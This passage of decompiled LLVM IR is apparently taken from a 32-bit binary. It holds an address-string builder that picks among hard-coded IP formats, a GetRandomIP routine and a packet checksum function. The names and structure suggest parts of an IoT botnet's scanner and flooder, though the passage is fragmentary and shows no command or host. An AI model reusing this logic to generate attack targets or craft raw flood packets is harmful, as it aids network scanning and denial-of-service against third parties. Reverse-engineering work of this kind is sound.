dec_label_pc_d74c:                                ; preds = %dec_label_pc_d718, %dec_label_pc_d724
  %v7_d750 = icmp eq i32 %v2_acd8, 198
  br i1 %v7_d750, label %dec_label_pc_d758, label %dec_label_pc_d780

dec_label_pc_d758:                                ; preds = %dec_label_pc_d74c
  %v2_d758 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d764 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d770 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d77c = sext i8 %v3_d764 to i32
  %v6_d77c = sext i8 %v3_d770 to i32
  %v8_d77c = call i32 @szprintf(i32 %v2_d758, i32 ptrtoint ([14 x i8]* @global_var_1f9d8.459 to i32), i32 %v4_d77c, i32 %v6_d77c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d780

dec_label_pc_d780:                                ; preds = %dec_label_pc_d74c, %dec_label_pc_d758
  %v7_d784 = icmp eq i32 %v2_acd8, 199
  br i1 %v7_d784, label %dec_label_pc_d78c, label %dec_label_pc_d7b4

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d780
  %v2_d78c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d798 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d7a4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d7b0 = sext i8 %v3_d798 to i32
  %v6_d7b0 = sext i8 %v3_d7a4 to i32
  %v8_d7b0 = call i32 @szprintf(i32 %v2_d78c, i32 ptrtoint ([14 x i8]* @global_var_1f9e8.461 to i32), i32 %v4_d7b0, i32 %v6_d7b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7b4

dec_label_pc_d7b4:                                ; preds = %dec_label_pc_d780, %dec_label_pc_d78c
  %v7_d7b8 = icmp eq i32 %v2_acd8, 200
  br i1 %v7_d7b8, label %dec_label_pc_d7c0, label %dec_label_pc_d7e8

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d7b4
  %v2_d7c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d7cc = load i8, i8* @global_var_2a549.78, align 1
  %v3_d7d8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d7e4 = sext i8 %v3_d7cc to i32
  %v6_d7e4 = sext i8 %v3_d7d8 to i32
  %v8_d7e4 = call i32 @szprintf(i32 %v2_d7c0, i32 ptrtoint ([14 x i8]* @global_var_1f9f8.463 to i32), i32 %v4_d7e4, i32 %v6_d7e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d7e8

dec_label_pc_d7e8:                                ; preds = %dec_label_pc_d7b4, %dec_label_pc_d7c0
  %v7_d7ec = icmp eq i32 %v2_acd8, 201
  br i1 %v7_d7ec, label %dec_label_pc_d828, label %dec_label_pc_d81c

dec_label_pc_d81c:                                ; preds = %dec_label_pc_d7e8
  br label %dec_label_pc_d850

dec_label_pc_d828:                                ; preds = %dec_label_pc_d7e8
  %v2_d7f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d800 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d80c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d818 = sext i8 %v3_d800 to i32
  %v6_d818 = sext i8 %v3_d80c to i32
  %v8_d818 = call i32 @szprintf(i32 %v2_d7f4, i32 ptrtoint ([14 x i8]* @global_var_1fa08.465 to i32), i32 %v4_d818, i32 %v6_d818, i32 ptrtoint (i32* @0 to i32))
  %v3_d834 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d840 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d84c = sext i8 %v3_d834 to i32
  %v6_d84c = sext i8 %v3_d840 to i32
  %v8_d84c = call i32 @szprintf(i32 %v2_d7f4, i32 ptrtoint ([13 x i8]* @global_var_1fa18.467 to i32), i32 %v4_d84c, i32 %v6_d84c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d850

dec_label_pc_d850:                                ; preds = %dec_label_pc_d81c, %dec_label_pc_d828
  %v7_d854 = icmp eq i32 %v2_acd8, 202
  br i1 %v7_d854, label %dec_label_pc_d85c, label %dec_label_pc_d884

dec_label_pc_d85c:                                ; preds = %dec_label_pc_d850
  %v2_d85c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d868 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d874 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d880 = sext i8 %v3_d868 to i32
  %v6_d880 = sext i8 %v3_d874 to i32
  %v8_d880 = call i32 @szprintf(i32 %v2_d85c, i32 ptrtoint ([13 x i8]* @global_var_1fa28.469 to i32), i32 %v4_d880, i32 %v6_d880, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d884

dec_label_pc_d884:                                ; preds = %dec_label_pc_d850, %dec_label_pc_d85c
  %v7_d888 = icmp eq i32 %v2_acd8, 203
  br i1 %v7_d888, label %dec_label_pc_d890, label %dec_label_pc_d8b8

dec_label_pc_d890:                                ; preds = %dec_label_pc_d884
  %v2_d890 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d89c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d8a8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d8b4 = sext i8 %v3_d89c to i32
  %v6_d8b4 = sext i8 %v3_d8a8 to i32
  %v8_d8b4 = call i32 @szprintf(i32 %v2_d890, i32 ptrtoint ([13 x i8]* @global_var_1fa38.471 to i32), i32 %v4_d8b4, i32 %v6_d8b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d8b8

dec_label_pc_d8b8:                                ; preds = %dec_label_pc_d884, %dec_label_pc_d890
  %v7_d8bc = icmp eq i32 %v2_acd8, 204
  br i1 %v7_d8bc, label %dec_label_pc_d8c4, label %dec_label_pc_d8ec

dec_label_pc_d8c4:                                ; preds = %dec_label_pc_d8b8
  %v2_d8c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d8d0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d8dc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d8e8 = sext i8 %v3_d8d0 to i32
  %v6_d8e8 = sext i8 %v3_d8dc to i32
  %v8_d8e8 = call i32 @szprintf(i32 %v2_d8c4, i32 ptrtoint ([13 x i8]* @global_var_1fa48.473 to i32), i32 %v4_d8e8, i32 %v6_d8e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d8ec

dec_label_pc_d8ec:                                ; preds = %dec_label_pc_d8b8, %dec_label_pc_d8c4
  %v7_d8f0 = icmp eq i32 %v2_acd8, 205
  br i1 %v7_d8f0, label %dec_label_pc_d8f8, label %dec_label_pc_d920

dec_label_pc_d8f8:                                ; preds = %dec_label_pc_d8ec
  %v2_d8f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d904 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d910 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d91c = sext i8 %v3_d904 to i32
  %v6_d91c = sext i8 %v3_d910 to i32
  %v8_d91c = call i32 @szprintf(i32 %v2_d8f8, i32 ptrtoint ([13 x i8]* @global_var_1fa58.475 to i32), i32 %v4_d91c, i32 %v6_d91c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d920

dec_label_pc_d920:                                ; preds = %dec_label_pc_d8ec, %dec_label_pc_d8f8
  %v7_d924 = icmp eq i32 %v2_acd8, 206
  br i1 %v7_d924, label %dec_label_pc_d92c, label %dec_label_pc_d954

dec_label_pc_d92c:                                ; preds = %dec_label_pc_d920
  %v2_d92c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d938 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d944 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d950 = sext i8 %v3_d938 to i32
  %v6_d950 = sext i8 %v3_d944 to i32
  %v8_d950 = call i32 @szprintf(i32 %v2_d92c, i32 ptrtoint ([13 x i8]* @global_var_1fa68.477 to i32), i32 %v4_d950, i32 %v6_d950, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d954

dec_label_pc_d954:                                ; preds = %dec_label_pc_d920, %dec_label_pc_d92c
  %v7_d958 = icmp eq i32 %v2_acd8, 207
  %v2_d960 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v7_d958, label %dec_label_pc_d960, label %dec_label_pc_d988

dec_label_pc_d960:                                ; preds = %dec_label_pc_d954
  %v3_d96c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d978 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d984 = sext i8 %v3_d96c to i32
  %v6_d984 = sext i8 %v3_d978 to i32
  %v8_d984 = call i32 @szprintf(i32 %v2_d960, i32 ptrtoint ([14 x i8]* @global_var_1fa78.479 to i32), i32 %v4_d984, i32 %v6_d984, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d988

dec_label_pc_d988:                                ; preds = %dec_label_pc_d954, %dec_label_pc_d960
  br i1 false, label %dec_label_pc_d994, label %dec_label_pc_d9bc

dec_label_pc_d994:                                ; preds = %dec_label_pc_d988
  br label %dec_label_pc_d9bc

dec_label_pc_d9bc:                                ; preds = %dec_label_pc_d988, %dec_label_pc_d994
  store i32 %v2_d960, i32* @r0, align 4
  %v1_d9c4 = call i32 @inet_addr(i32 %v2_d960)
  store i32 %v3_ab54, i32* @fp, align 4
  ret i32 %v1_d9c4

; uselistorder directives
  uselistorder i32 %v2_d960, { 1, 0, 2 }
  uselistorder i32 %v0_ac74, { 1, 0 }
  uselistorder i32 %v0_ac28, { 1, 0 }
  uselistorder i32 %v0_abdc, { 1, 0 }
  uselistorder i32 %v0_ab90, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f7a8.388 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f73c.373 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f5ac.322 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f520.304 to i32), { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1f4c0.292 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1f108.171 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1f0e8.167 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1f0d8.165 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1f0a8.159 to i32), { 1, 0 }
  uselistorder i8* @global_var_2a54a.79, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2a549.78, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d9bc, { 1, 0 }
  uselistorder label %dec_label_pc_d988, { 1, 0 }
  uselistorder label %dec_label_pc_d954, { 1, 0 }
  uselistorder label %dec_label_pc_d920, { 1, 0 }
  uselistorder label %dec_label_pc_d8ec, { 1, 0 }
  uselistorder label %dec_label_pc_d8b8, { 1, 0 }
  uselistorder label %dec_label_pc_d884, { 1, 0 }
  uselistorder label %dec_label_pc_d850, { 1, 0 }
  uselistorder label %dec_label_pc_d7e8, { 1, 0 }
  uselistorder label %dec_label_pc_d7b4, { 1, 0 }
  uselistorder label %dec_label_pc_d780, { 1, 0 }
  uselistorder label %dec_label_pc_d74c, { 1, 0 }
  uselistorder label %dec_label_pc_d718, { 1, 0 }
  uselistorder label %dec_label_pc_d6e4, { 1, 0 }
  uselistorder label %dec_label_pc_d6b0, { 1, 0 }
  uselistorder label %dec_label_pc_d67c, { 1, 0 }
  uselistorder label %dec_label_pc_d648, { 1, 0 }
  uselistorder label %dec_label_pc_d614, { 1, 0 }
  uselistorder label %dec_label_pc_d5e0, { 1, 0 }
  uselistorder label %dec_label_pc_d5ac, { 1, 0 }
  uselistorder label %dec_label_pc_d578, { 1, 0 }
  uselistorder label %dec_label_pc_d544, { 1, 0 }
  uselistorder label %dec_label_pc_d510, { 1, 0 }
  uselistorder label %dec_label_pc_d4dc, { 1, 0 }
  uselistorder label %dec_label_pc_d4a8, { 1, 0 }
  uselistorder label %dec_label_pc_d474, { 1, 0 }
  uselistorder label %dec_label_pc_d440, { 1, 0 }
  uselistorder label %dec_label_pc_d40c, { 1, 0 }
  uselistorder label %dec_label_pc_d3d8, { 1, 0 }
  uselistorder label %dec_label_pc_d3a4, { 1, 0 }
  uselistorder label %dec_label_pc_d370, { 1, 0 }
  uselistorder label %dec_label_pc_d33c, { 1, 0 }
  uselistorder label %dec_label_pc_d308, { 1, 0 }
  uselistorder label %dec_label_pc_d2d4, { 1, 0 }
  uselistorder label %dec_label_pc_d2a0, { 1, 0 }
  uselistorder label %dec_label_pc_d26c, { 1, 0 }
  uselistorder label %dec_label_pc_d238, { 1, 0 }
  uselistorder label %dec_label_pc_d204, { 1, 0 }
  uselistorder label %dec_label_pc_d1d0, { 1, 0 }
  uselistorder label %dec_label_pc_d19c, { 1, 0 }
  uselistorder label %dec_label_pc_d168, { 1, 0 }
  uselistorder label %dec_label_pc_d134, { 1, 0 }
  uselistorder label %dec_label_pc_d100, { 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d098, { 1, 0 }
  uselistorder label %dec_label_pc_d064, { 1, 0 }
  uselistorder label %dec_label_pc_d030, { 1, 0 }
  uselistorder label %dec_label_pc_cffc, { 1, 0 }
  uselistorder label %dec_label_pc_cfc8, { 1, 0 }
  uselistorder label %dec_label_pc_cf94, { 1, 0 }
  uselistorder label %dec_label_pc_cf60, { 1, 0 }
  uselistorder label %dec_label_pc_cf2c, { 1, 0 }
  uselistorder label %dec_label_pc_cef8, { 1, 0 }
  uselistorder label %dec_label_pc_cec4, { 1, 0 }
  uselistorder label %dec_label_pc_ce90, { 1, 0 }
  uselistorder label %dec_label_pc_ce5c, { 1, 0 }
  uselistorder label %dec_label_pc_ce28, { 1, 0 }
  uselistorder label %dec_label_pc_cdf4, { 1, 0 }
  uselistorder label %dec_label_pc_cdc0, { 1, 0 }
  uselistorder label %dec_label_pc_cd8c, { 1, 0 }
  uselistorder label %dec_label_pc_cd58, { 1, 0 }
  uselistorder label %dec_label_pc_cd24, { 1, 0 }
  uselistorder label %dec_label_pc_ccf0, { 1, 0 }
  uselistorder label %dec_label_pc_ccbc, { 1, 0 }
  uselistorder label %dec_label_pc_cc88, { 1, 0 }
  uselistorder label %dec_label_pc_cc54, { 1, 0 }
  uselistorder label %dec_label_pc_cc20, { 1, 0 }
  uselistorder label %dec_label_pc_cbec, { 1, 0 }
  uselistorder label %dec_label_pc_cbb8, { 1, 0 }
  uselistorder label %dec_label_pc_cb84, { 1, 0 }
  uselistorder label %dec_label_pc_cb50, { 1, 0 }
  uselistorder label %dec_label_pc_cb1c, { 1, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0 }
  uselistorder label %dec_label_pc_cab4, { 1, 0 }
  uselistorder label %dec_label_pc_ca80, { 1, 0 }
  uselistorder label %dec_label_pc_ca4c, { 1, 0 }
  uselistorder label %dec_label_pc_ca18, { 1, 0 }
  uselistorder label %dec_label_pc_c9e4, { 1, 0 }
  uselistorder label %dec_label_pc_c9b0, { 1, 0 }
  uselistorder label %dec_label_pc_c97c, { 1, 0 }
  uselistorder label %dec_label_pc_c948, { 1, 0 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %dec_label_pc_c8e0, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c844, { 1, 0 }
  uselistorder label %dec_label_pc_c810, { 1, 0 }
  uselistorder label %dec_label_pc_c7dc, { 1, 0 }
  uselistorder label %dec_label_pc_c7a8, { 1, 0 }
  uselistorder label %dec_label_pc_c774, { 1, 0 }
  uselistorder label %dec_label_pc_c740, { 1, 0 }
  uselistorder label %dec_label_pc_c70c, { 1, 0 }
  uselistorder label %dec_label_pc_c6d8, { 1, 0 }
  uselistorder label %dec_label_pc_c6a4, { 1, 0 }
  uselistorder label %dec_label_pc_c670, { 1, 0 }
  uselistorder label %dec_label_pc_c63c, { 1, 0 }
  uselistorder label %dec_label_pc_c608, { 1, 0 }
  uselistorder label %dec_label_pc_c5d4, { 1, 0 }
  uselistorder label %dec_label_pc_c5a0, { 1, 0 }
  uselistorder label %dec_label_pc_c56c, { 1, 0 }
  uselistorder label %dec_label_pc_c538, { 1, 0 }
  uselistorder label %dec_label_pc_c504, { 1, 0 }
  uselistorder label %dec_label_pc_c4d0, { 1, 0 }
  uselistorder label %dec_label_pc_c49c, { 1, 0 }
  uselistorder label %dec_label_pc_c468, { 1, 0 }
  uselistorder label %dec_label_pc_c434, { 1, 0 }
  uselistorder label %dec_label_pc_c400, { 1, 0 }
  uselistorder label %dec_label_pc_c3cc, { 1, 0 }
  uselistorder label %dec_label_pc_c398, { 1, 0 }
  uselistorder label %dec_label_pc_c364, { 1, 0 }
  uselistorder label %dec_label_pc_c330, { 1, 0 }
  uselistorder label %dec_label_pc_c2fc, { 1, 0 }
  uselistorder label %dec_label_pc_c2c8, { 1, 0 }
  uselistorder label %dec_label_pc_c294, { 1, 0 }
  uselistorder label %dec_label_pc_c260, { 1, 0 }
  uselistorder label %dec_label_pc_c22c, { 1, 0 }
  uselistorder label %dec_label_pc_c1f8, { 1, 0 }
  uselistorder label %dec_label_pc_c1c4, { 1, 0 }
  uselistorder label %dec_label_pc_c190, { 1, 0 }
  uselistorder label %dec_label_pc_c15c, { 1, 0 }
  uselistorder label %dec_label_pc_c128, { 1, 0 }
  uselistorder label %dec_label_pc_c0f4, { 1, 0 }
  uselistorder label %dec_label_pc_c0c0, { 1, 0 }
  uselistorder label %dec_label_pc_c08c, { 1, 0 }
  uselistorder label %dec_label_pc_c058, { 1, 0 }
  uselistorder label %dec_label_pc_c024, { 1, 0 }
  uselistorder label %dec_label_pc_bff0, { 1, 0 }
  uselistorder label %dec_label_pc_bfbc, { 1, 0 }
  uselistorder label %dec_label_pc_bf88, { 1, 0 }
  uselistorder label %dec_label_pc_bf54, { 1, 0 }
  uselistorder label %dec_label_pc_bf20, { 1, 0 }
  uselistorder label %dec_label_pc_beec, { 1, 0 }
  uselistorder label %dec_label_pc_beb8, { 1, 0 }
  uselistorder label %dec_label_pc_be84, { 1, 0 }
  uselistorder label %dec_label_pc_be50, { 1, 0 }
  uselistorder label %dec_label_pc_be1c, { 1, 0 }
  uselistorder label %dec_label_pc_bde8, { 1, 0 }
  uselistorder label %dec_label_pc_bdb4, { 1, 0 }
  uselistorder label %dec_label_pc_bd80, { 1, 0 }
  uselistorder label %dec_label_pc_bb00, { 1, 0 }
  uselistorder label %dec_label_pc_bacc, { 1, 0 }
  uselistorder label %dec_label_pc_ba98, { 1, 0 }
  uselistorder label %dec_label_pc_ba64, { 1, 0 }
  uselistorder label %dec_label_pc_ba30, { 1, 0 }
  uselistorder label %dec_label_pc_b9fc, { 1, 0 }
  uselistorder label %dec_label_pc_b9c8, { 1, 0 }
  uselistorder label %dec_label_pc_b994, { 1, 0 }
  uselistorder label %dec_label_pc_b960, { 1, 0 }
  uselistorder label %dec_label_pc_b92c, { 1, 0 }
  uselistorder label %dec_label_pc_b8f8, { 1, 0 }
  uselistorder label %dec_label_pc_b8c4, { 1, 0 }
  uselistorder label %dec_label_pc_b890, { 1, 0 }
  uselistorder label %dec_label_pc_b85c, { 1, 0 }
  uselistorder label %dec_label_pc_b828, { 1, 0 }
  uselistorder label %dec_label_pc_b7f4, { 1, 0 }
  uselistorder label %dec_label_pc_b7c0, { 1, 0 }
  uselistorder label %dec_label_pc_b78c, { 1, 0 }
  uselistorder label %dec_label_pc_b758, { 1, 0 }
  uselistorder label %dec_label_pc_b724, { 1, 0 }
  uselistorder label %dec_label_pc_b6f0, { 1, 0 }
  uselistorder label %dec_label_pc_b6bc, { 1, 0 }
  uselistorder label %dec_label_pc_b688, { 1, 0 }
  uselistorder label %dec_label_pc_b654, { 1, 0 }
  uselistorder label %dec_label_pc_b620, { 1, 0 }
  uselistorder label %dec_label_pc_b5ec, { 1, 0 }
  uselistorder label %dec_label_pc_b5b8, { 1, 0 }
  uselistorder label %dec_label_pc_b584, { 1, 0 }
  uselistorder label %dec_label_pc_b550, { 1, 0 }
  uselistorder label %dec_label_pc_b51c, { 1, 0 }
  uselistorder label %dec_label_pc_b4e8, { 1, 0 }
  uselistorder label %dec_label_pc_b4b4, { 1, 0 }
  uselistorder label %dec_label_pc_b480, { 1, 0 }
  uselistorder label %dec_label_pc_b44c, { 1, 0 }
  uselistorder label %dec_label_pc_b418, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 1, 0 }
  uselistorder label %dec_label_pc_b3b0, { 1, 0 }
  uselistorder label %dec_label_pc_b37c, { 1, 0 }
  uselistorder label %dec_label_pc_b348, { 1, 0 }
  uselistorder label %dec_label_pc_b314, { 1, 0 }
  uselistorder label %dec_label_pc_b2e0, { 1, 0 }
  uselistorder label %dec_label_pc_b2ac, { 1, 0 }
  uselistorder label %dec_label_pc_b278, { 1, 0 }
  uselistorder label %dec_label_pc_b244, { 1, 0 }
  uselistorder label %dec_label_pc_b210, { 1, 0 }
  uselistorder label %dec_label_pc_b1dc, { 1, 0 }
  uselistorder label %dec_label_pc_b1a8, { 1, 0 }
  uselistorder label %dec_label_pc_b174, { 1, 0 }
  uselistorder label %dec_label_pc_b140, { 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 1, 0 }
  uselistorder label %dec_label_pc_b0d8, { 1, 0 }
  uselistorder label %dec_label_pc_b0a4, { 1, 0 }
  uselistorder label %dec_label_pc_b070, { 1, 0 }
  uselistorder label %dec_label_pc_b03c, { 1, 0 }
  uselistorder label %dec_label_pc_b008, { 1, 0 }
  uselistorder label %dec_label_pc_afd4, { 1, 0 }
  uselistorder label %dec_label_pc_afa0, { 1, 0 }
  uselistorder label %dec_label_pc_af6c, { 1, 0 }
  uselistorder label %dec_label_pc_af38, { 1, 0 }
  uselistorder label %dec_label_pc_af04, { 1, 0 }
  uselistorder label %dec_label_pc_aed0, { 1, 0 }
  uselistorder label %dec_label_pc_ae9c, { 1, 0 }
  uselistorder label %dec_label_pc_ae68, { 1, 0 }
  uselistorder label %dec_label_pc_ae34, { 1, 0 }
  uselistorder label %dec_label_pc_ae00, { 1, 0 }
  uselistorder label %dec_label_pc_adcc, { 1, 0 }
  uselistorder label %dec_label_pc_ad98, { 1, 0 }
  uselistorder label %dec_label_pc_ad64, { 1, 0 }
  uselistorder label %dec_label_pc_ad30, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_dacc = load i32, i32* @fp, align 4
  %v2_dae0 = load i32, i32* @global_var_3078c.483, align 4
  %v1_dae8 = call i32 @__GI_ntohl(i32 %v2_dae0)
  %v2_daf4 = and i32 %v1_dae8, %arg1
  %v0_dafc = call i32 @rand_cmwc()
  %v1_db08 = sub i32 -1, %arg1
  %v2_db0c = and i32 %v0_dafc, %v1_db08
  %v2_db14 = xor i32 %v2_db0c, %v2_daf4
  store i32 %v3_dacc, i32* @fp, align 4
  ret i32 %v2_db14
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_dba09 = icmp sgt i32 %arg2, 1
  br i1 %v8_dba09, label %dec_label_pc_db58, label %dec_label_pc_dba4

dec_label_pc_db58:                                ; preds = %entry, %dec_label_pc_db58
  %v2_db6c = phi i32 [ %v2_db70, %dec_label_pc_db58 ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_db74, %dec_label_pc_db58 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_db90, %dec_label_pc_db58 ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_db88, %dec_label_pc_db58 ], [ %arg1, %entry ]
  %v4_db58 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_db5c = load i16, i16* %stack_var_-36.010, align 2
  %v3_db5c = zext i16 %v2_db5c to i32
  %v2_db70 = add i32 %v3_db5c, %v2_db6c
  %v3_db70 = icmp ult i32 %v2_db70, %v2_db6c
  %v4_db74 = zext i1 %v3_db70 to i32
  %v5_db74 = add i32 %v4_db74, %stack_var_-44.012
  %v1_db84 = add i32 %v4_db58, 2
  %v5_db88 = inttoptr i32 %v1_db84 to i16*
  %v1_db90 = add nsw i32 %stack_var_-40.011, -2
  %v8_dba0 = icmp sgt i32 %v1_db90, 1
  br i1 %v8_dba0, label %dec_label_pc_db58, label %dec_label_pc_db98.dec_label_pc_dba4_crit_edge

dec_label_pc_db98.dec_label_pc_dba4_crit_edge:    ; preds = %dec_label_pc_db58
  br label %dec_label_pc_dba4

dec_label_pc_dba4:                                ; preds = %dec_label_pc_db98.dec_label_pc_dba4_crit_edge, %entry
  %v2_dbc4 = phi i32 [ %v2_db70, %dec_label_pc_db98.dec_label_pc_dba4_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_db88, %dec_label_pc_db98.dec_label_pc_dba4_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_db74, %dec_label_pc_db98.dec_label_pc_dba4_crit_edge ], [ 0, %entry ]
  %v7_db9c.lcssa.in = phi i32 [ %v1_db90, %dec_label_pc_db98.dec_label_pc_dba4_crit_edge ], [ %arg2, %entry ]
  %v7_db9c.lcssa = icmp eq i32 %v7_db9c.lcssa.in, 1
  br i1 %v7_db9c.lcssa, label %dec_label_pc_dbb0, label %dec_label_pc_dc2c.preheader

dec_label_pc_dbb0:                                ; preds = %dec_label_pc_dba4
  %v1_dbb4 = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_dbb4 = load i8, i8* %v1_dbb4, align 1
  %v3_dbb4 = zext i8 %v2_dbb4 to i32
  %v2_dbc8 = add i32 %v3_dbb4, %v2_dbc4
  %v3_dbc8 = icmp ult i32 %v2_dbc8, %v2_dbc4
  %v4_dbcc = zext i1 %v3_dbc8 to i32
  %v5_dbcc = add i32 %v4_dbcc, %stack_var_-44.0.lcssa
  br label %dec_label_pc_dc2c.preheader

dec_label_pc_dc2c.preheader:                      ; preds = %dec_label_pc_dbb0, %dec_label_pc_dba4
  %v3_dc58.ph = phi i32 [ %v2_dbc4, %dec_label_pc_dba4 ], [ %v2_dbc8, %dec_label_pc_dbb0 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_dba4 ], [ %v5_dbcc, %dec_label_pc_dbb0 ]
  %v3_dc3037 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_dc3838 = udiv i32 %v3_dc58.ph, 65536
  %v2_dc3c39 = or i32 %v3_dc3037, %v3_dc3838
  %v3_dc4440 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_dc4c41 = or i32 %v2_dc3c39, %v3_dc4440
  %v2_dc5042 = icmp eq i32 %v2_dc4c41, 0
  br i1 %v2_dc5042, label %dec_label_pc_dc58, label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_dc2c.preheader, %dec_label_pc_dbdc
